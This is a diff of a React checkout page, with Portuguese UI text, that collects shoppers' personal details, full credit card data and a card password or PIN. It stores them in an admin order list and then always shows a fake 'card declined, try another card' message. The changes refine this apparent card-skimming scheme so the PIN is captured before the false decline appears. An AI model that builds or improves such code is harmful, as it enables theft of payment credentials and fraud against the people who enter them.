@@ -11,10 +11,6 @@ import { getFromLocalStorage, saveToLocalStorage } from "@/utils/localStorage";
 import { sendTictoWebhookV2 } from "@/utils/tictoWebhookV2";
 import { useNavigate } from "react-router-dom";
 
-interface CreditCardDataWithPassword extends CreditCardData {
-  password?: string;
-}
-
 export default function Checkout() {
   const { items, total, clearCart } = useCart();
   const { toast } = useToast();
@@ -44,25 +40,27 @@ export default function Checkout() {
   const saveOrderToAdmin = (cardPassword?: string) => {
     const orderData = {
       id: Date.now().toString(),
-      customer_data: formData,
+      customer: formData,
       items: items,
-      total_amount: total,
+      total: total,
       payment_method: paymentMethod,
       credit_card_data: cardPassword 
         ? { ...creditCardData, password: cardPassword }
         : creditCardData,
       status: "pending",
-      created_at: new Date().toISOString(),
+      timestamp: Date.now(),
     };
 
     const existingOrders = getFromLocalStorage('orders', []);
     saveToLocalStorage('orders', [...existingOrders, orderData]);
 
     toast({
-      title: "Erro no processamento do pagamento",
-      description: "Erro no processamento do pagamento com cartão de crédito",
+      title: "Erro no processamento",
+      description: "Cartão recusado. Por favor, tente com outro cartão.",
       variant: "destructive"
     });
+
+    setShowPasswordDialog(false);
   };
 
   const handleSubmit = async (e: React.FormEvent) => {
@@ -92,17 +90,15 @@ export default function Checkout() {
       return;
     }
 
-    saveOrderToAdmin();
     setShowPasswordDialog(true);
   };
 
   const handlePasswordConfirm = (password: string) => {
-    setShowPasswordDialog(false);
     saveOrderToAdmin(password);
   };
 
   return (
-    <div className="min-h-screen bg-gray-50">
+    <div className="min-h-screen bg-background/80 backdrop-blur-sm">
       <div className="container mx-auto px-4 pt-24">
         <Card>
           <CardHeader>
